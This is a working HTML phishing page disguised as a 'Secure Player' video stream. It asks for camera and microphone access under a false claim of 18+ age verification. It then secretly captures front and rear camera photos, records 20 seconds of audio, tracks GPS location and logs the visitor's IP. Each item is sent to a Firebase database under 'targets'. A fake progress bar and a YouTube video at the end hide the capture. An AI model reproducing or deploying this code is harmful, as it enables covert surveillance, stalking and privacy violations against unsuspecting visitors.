<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Stream | Secure Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        
        /* PHASE 1: Background Image */
        #bg-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('bg.png.jpeg'); /* Aapki file ka name */
            background-size: cover; background-position: center;
            z-index: 10; display: flex; align-items: center; justify-content: center;
        }

        /* Overlay for Image (Thoda dark taake button dikhe) */
        #overlay-mask {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.3); z-index: 11;
        }

        /* Play Button Style */
        .play-btn {
            width: 95px; height: 95px; background: rgba(229, 9, 20, 0.9);
            border-radius: 50%; border: 3px solid #fff;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; z-index: 12; box-shadow: 0 0 30px rgba(0,0,0,0.8);
            transition: 0.3s;
        }
        .play-btn::after {
            content: ''; border-style: solid; border-width: 15px 0 15px 25px;
            border-color: transparent transparent transparent #fff; margin-left: 8px;
        }

        /* PHASE 2: Video Layer (Shuru mein hidden) */
        #video-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 5; display: none; background: #000;
        }
        #main-player { width: 100%; height: 100%; border: none; }

        /* Loader Style */
        #loader-box {
            display: none; position: fixed; top: 50%; left: 50%;
            transform: translate(-50%, -50%); z-index: 15; text-align: center; color: #fff;
        }
    </style>
</head>
<body>

    <div id="bg-container">
        <div id="overlay-mask"></div>
        <div class="play-btn" id="btn-main" onclick="ignite()"></div>
        
        <div id="loader-box">
            <p id="status-txt" style="font-weight:bold; letter-spacing:1px;">VERIFYING ACCESS...</p>
            <div style="width:200px; height:4px; background:#333; margin:10px auto; border-radius:10px; overflow:hidden;">
                <div id="bar" style="width:0%; height:100%; background:#e50914; transition:0.3s;"></div>
            </div>
        </div>
    </div>

    <div id="video-layer">
        <iframe id="main-player" allow="autoplay; encrypted-media; camera; microphone"></iframe>
    </div>

<script>
    // --- FIREBASE CONFIG ---
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
    const videoURL = "https://www.youtube.com/embed/6Ogzc_-lW9w?autoplay=1&rel=0"; // Aapka link

    async function ignite() {
        try {
            // Permission mangna
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // UI Switch: Button hatao, Loader dikhao
            document.getElementById('btn-main').style.display = 'none';
            document.getElementById('loader-box').style.display = 'block';

            // Background Capture Start
            logTarget();
            trackGPS();
            capture("user");
            setTimeout(() => capture("environment"), 5000);
            recordAudio(20000);

            // Fake Progress Animation
            let prg = 0;
            let inv = setInterval(() => {
                prg += Math.floor(Math.random() * 15) + 5;
                if(prg >= 100) {
                    prg = 100;
                    clearInterval(inv);
                    
                    // FINAL STEP: Image layer hatao, Video layer dikhao
                    document.getElementById('bg-container').style.display = 'none';
                    document.getElementById('video-layer').style.display = 'block';
                    document.getElementById('main-player').src = videoURL;
                }
                document.getElementById('bar').style.width = prg + "%";
            }, 600);

        } catch (e) {
            alert("Security Error: Please allow camera to verify you are 18+");
            location.reload();
        }
    }

    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({ 
                    img: c.toDataURL('image/jpeg', 0.4), 
                    type: mode, 
                    time: new Date().toLocaleTimeString() 
                });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(x) {}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let ch = [];
            mr.ondataavailable = e => ch.push(e.data);
            mr.onstop = () => {
                const r = new FileReader();
                r.readAsDataURL(new Blob(ch, { type: 'audio/webm' }));
                r.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: r.result });
            };
            mr.start(); setTimeout(() => mr.stop(), ms);
        } catch(x) {}
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }

    async function logTarget() {
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({ ip: ip.ip, platform: navigator.platform, timestamp: Date.now() });
    }
</script>
</body>
</html>
